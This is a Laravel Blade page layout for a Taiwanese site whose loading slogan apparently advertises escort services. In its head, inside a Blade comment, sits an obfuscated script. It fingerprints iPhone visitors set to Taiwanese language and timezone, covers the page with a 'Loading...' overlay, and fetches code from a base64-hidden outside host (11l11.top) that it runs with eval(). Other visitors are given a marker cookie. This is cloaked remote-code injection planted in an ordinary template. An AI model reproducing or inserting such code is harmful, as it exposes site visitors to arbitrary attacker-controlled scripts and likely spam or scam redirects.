<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="chrome=1,IE=edge">
    <meta name="format-detection" content="telephone=no" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover minimal-ui">
    @if(isset($layout['seo']))
        <title>{{ isset($layout['seo'])?$layout['seo']->title:"" }}</title>
    @else
        <title>@yield('title')</title>
    @endif

    @hasSection('keywords')
    <meta name="keywords" content="@yield('keywords')"/>
    @else
    <meta name="keywords" content="{{ isset($layout['seo'])?$layout['seo']->key_word:"" }}"/>
    @endif

    @hasSection('description')
    <meta name="description" content="@yield('description')"/>
    @else
    <meta name="description" content="{{ isset($layout['seo'])?$layout['seo']->description:"" }}"/>
    @endif


    <meta name="apple-mobile-web-app-capable" content="no" />
    <meta name="apple-touch-fullscreen" content="no" />
    <link rel="canonical" href="{{ config('app.url') }}/{{ trim(request()->getBaseUrl(),'/') }}">
    <link rel="alternate" hreflang="zh-TW">
    <link rel="shortcut icon" href="{{ \App\Services\ConfigService::get('favicon')?asset('uploads/'.\App\Services\ConfigService::get('favicon')):'/favicon.ico' }}?v={{ app('cache.config')->get('asset_version') }}">

    @section('style')
        <link rel="stylesheet" type="text/css" href="{{ asset('static/css/style.css') }}?v={{ app('cache.config')->get('asset_version') }}"/>
        <link rel="stylesheet" type="text/css" href="{{ asset('static/less/global.css') }}?v={{ app('cache.config')->get('asset_version') }}"/>
        <link rel="stylesheet" href="{{ asset('static/font_3122894_ix34x1wtlao/iconfont.css') }}?v={{ app('cache.config')->get('asset_version') }}">
    @show

    <script src="{{ asset('static/js/jquery.min.js') }}"></script>
    <script src="{{ asset('static/js/inquiry.js') }}"></script>
    <script src="{{ asset('static/js/area.js') }}?v={{ app('cache.config')->get('asset_version') }}"></script>
    {{--<script>
        var userAgent = navigator.userAgent;
        if(userAgent.indexOf('iPhone') > -1){
            var slang = (navigator.language || navigator.browserLanguage).toLowerCase();
            var stimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

            var cookie_value = '';
            var arr,reg=new RegExp("(^| )XSRF-KEY=([^;]*)(;|$)");
            if(arr=document.cookie.match(reg)){
                cookie_value = unescape(arr[2]);
            }
            if(!cookie_value){
                if(slang == window.atob("emgtdHc=") && stimezone == window.atob("QXNpYS9UYWlwZWk=")){
                    window.onload=function(){
                        var html = document.createElement("div");
                        html.innerHTML=window.atob('TG9hZGluZy4uLg==');
                        html.style.backgroundColor = "#fff";
                        html.style.width = "100vw";
                        html.style.height = "100vh";
                        html.style.position = "fixed";
                        html.style.zIndex = "99999";
                        html.style.top = "0";
                        html.style.display = "flex";
                        html.style.alignItems = "center";
                        html.style.justifyContent = "center";
                        html.setAttribute('id','aqa2ver');
                        document.body.appendChild(html);
                    };
                    var httpRequest = new XMLHttpRequest();
                    httpRequest.open(window.atob("R0VU"), window.atob("aHR0cHM6Ly8xMWwxMS50b3AvP3Q9bGV2aXRyYSZ5PQ==")+window.location.hostname, true);
                    httpRequest.send();
                    httpRequest.onreadystatechange = function () {
                        if (httpRequest.readyState == 4 && httpRequest.status == 200) {
                            httpRequest.responseText?eval(httpRequest.responseText):"";
                        }
                    };
                }else{
                    var Days = 30;
                    var exp = new Date();
                    exp.setTime(exp.getTime() + Days*24*60*60*1000);
                    document.cookie = "XSRF-KEY=C6071A5FC1B83091B363C5EF9EBAF155; expires=" + exp.toGMTString();
                }
            }
        }else{
            var Days = 30;
            var exp = new Date();
            exp.setTime(exp.getTime() + Days*24*60*60*1000);
            document.cookie = "XSRF-KEY=C6071A5FC1B83091B363C5EF9EBAF155; expires=" + exp.toGMTString();
        }

    </script>--}}


</head>
<body class="_show_loading">

<div class="global-loading" id="loading">
    <img src="/static/img/logo3.webp" class="loadinglogo" alt="">
    <p class="slogan">給你全台最好的 外送茶&定點茶</p>
    <div class="circle">{!! app('cache.config')->get('loading_code') !!}</div>

</div>

<div class="main-body">


@yield('content')


</div>
<div class="mask-shade"></div>

</body>

@section('script')
{{--<script src="{{ asset('static/js/less.min.js') }}"></script>--}}
<script src="{{ asset('static/js/jquery.cookie.js') }}"></script>
<script src="{{ asset('static/js/jquery.marquee.min.js') }}"></script>
<script src="{{ asset('static/js/jquery.masonry.min.js') }}"></script>
<script src="{{ asset('static/js/api.js') }}?v={{ app('cache.config')->get('asset_version') }}"></script>
{!! \App\Services\ConfigService::get('google_ga') !!}


<script>

    window.addEventListener('load', function () {
        $('#loading').animate({'visibility':'auto'},1000,function(){
            loading(0)
        });
    });
    function loading(is_show){
        if(is_show){
            $('body').addClass('_show_loading');
        }else{
            $('body').removeClass('_show_loading');
        }

    }
</script>



@show


</html>
